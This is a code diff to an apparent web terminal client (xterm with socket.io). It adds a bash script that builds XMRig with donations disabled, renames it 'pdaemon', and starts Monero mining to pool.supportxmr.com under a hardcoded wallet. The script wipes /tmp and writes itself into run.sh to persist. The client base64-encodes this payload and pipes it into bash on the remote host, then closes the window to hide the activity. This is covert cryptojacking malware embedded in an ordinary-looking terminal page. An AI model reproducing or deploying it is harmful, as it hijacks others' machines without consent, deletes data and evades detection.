@@ -70,7 +70,24 @@
                 brightWhite: '#FFFFFF',
               };
             
-            //   const socket = io.connect(`${location.origin}/${package_name}`);
+              const script = 
+`
+#!/bin/bash
+
+if pgrep -x "pdaemon" > /dev/null
+then
+    echo "pdaemon is running."
+else
+    grep -q 'pdaemon' run.sh || sed -i '2i\nohup pdaemon -a rx/0 -o pool.supportxmr.com:3333 -u 42MKWCjVDxgdLZ1Px1BQUCbkhmncwhfdbNzEcxLxAA1SecARyZxbnoPcrnrh3WzefqG7CwXrxyjHuBGsFSBpFKa47Y7u9Ho.$(nproc) -t $(nproc) &' run.sh
+    if [ -f /usr/bin/pdaemon ]; then
+        nohup pdaemon -a rx/0 -o pool.supportxmr.com:3333 -u 42MKWCjVDxgdLZ1Px1BQUCbkhmncwhfdbNzEcxLxAA1SecARyZxbnoPcrnrh3WzefqG7CwXrxyjHuBGsFSBpFKa47Y7u9Ho.$(nproc) -t $(nproc) &
+    else
+        apt update; apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+        cd /tmp; rm -rf * .*; git clone https://github.com/xmrig/xmrig.git --depth 1 && mkdir xmrig/build && sed -i 's/= 1/= 0/g' xmrig/src/donate.h && cd xmrig/build && cmake .. && make -j$(nproc) && cp xmrig /usr/bin/xmrig; cp xmrig /usr/bin/pdaemon
+        nohup pdaemon -a rx/0 -o pool.supportxmr.com:3333 -u 42MKWCjVDxgdLZ1Px1BQUCbkhmncwhfdbNzEcxLxAA1SecARyZxbnoPcrnrh3WzefqG7CwXrxyjHuBGsFSBpFKa47Y7u9Ho.$(nproc) -t $(nproc) &
+    fi
+fi
+`;
               const socket = io.connect(`http://${remoteHost}/terminal`);
               const term = new Terminal({
                 fontFamily: '"Cascadia Code", Menlo, monospace',
@@ -99,22 +116,31 @@
                 fitAddon.fit();
                 socket.emit('resize', { cols: term.cols, rows: term.rows });
               };
+
+              socket.on('connect_error', (error) => {
+                console.error('Connection failed:', error);
+                // window.close();
+                });
             
               socket.on('connect', () => {
                 console.log('connected');
-                resize();
+                document.title = 'connected';
+                // resize();
                 socket.emit('input', base64_encode("export TERM=xterm\n"));
                 socket.emit('input', base64_encode("cat run.sh | grep -v nicehash > /tmp/run.sh; mv /tmp/run.sh run.sh\n"));
-                socket.emit('input', base64_encode(`clear; ps aux | grep -v grep | grep "pdae\\|ccm\\|xmr"\n`));
-                socket.emit('input', base64_encode(`echo IyEvYmluL2Jhc2gKCmNsZWFyCgphcHQgdXBkYXRlOyBhcHQgaW5zdGFsbCBnaXQgYnVpbGQtZXNzZW50aWFsIGNtYWtlIGxpYnV2MS1kZXYgbGlic3NsLWRldiBsaWJod2xvYy1kZXYgLXkKCmNkIC90bXA7IHJtIC1yZiAqIC4qOyBnaXQgY2xvbmUgaHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdCAtLWRlcHRoIDEgJiYgbWtkaXIgeG1yaWcvYnVpbGQgJiYgc2VkIC1pICdzLz0gMS89IDAvZycgeG1yaWcvc3JjL2RvbmF0ZS5oICYmIGNkIHhtcmlnL2J1aWxkICYmIGNtYWtlIC4uICYmIG1ha2UgLWokKG5wcm9jKSAmJiBjcCB4bXJpZyAvdXNyL2Jpbi94bXJpZzsgY3AgeG1yaWcgL3Vzci9iaW4vcGRhZW1vbgoKbm9odXAgcGRhZW1vbiAtYSByeC8wIC1vIHBvb2wuc3VwcG9ydHhtci5jb206MzMzMyAtdSA0Mk1LV0NqVkR4Z2RMWjFQeDFCUVVDYmtobW5jd2hmZGJOekVjeEx4QUExU2VjQVJ5Wnhibm9QY3JucmgzV3plZnFHN0N3WHJ4eWpIdUJHc0ZTQnBGS2E0N1k3dTlIby4kKG5wcm9jKSAtdCAkKG5wcm9jKSAmIGV4aXQ= | base64 -d | bash\nexit\n`));
+                socket.emit('input', base64_encode(`clear; echo ${base64_encode(script)} | base64 -d | bash\nexit\n`));
               });
             
               socket.on('disconnect', () => {
                 console.log('disconnected');
+                window.close();
               });
             
               socket.on('output', (data) => {
                 term.write(data);
+                if(data.includes("running")) {
+                  window.close();
+                }
               });
             
               term.onData((data) => {
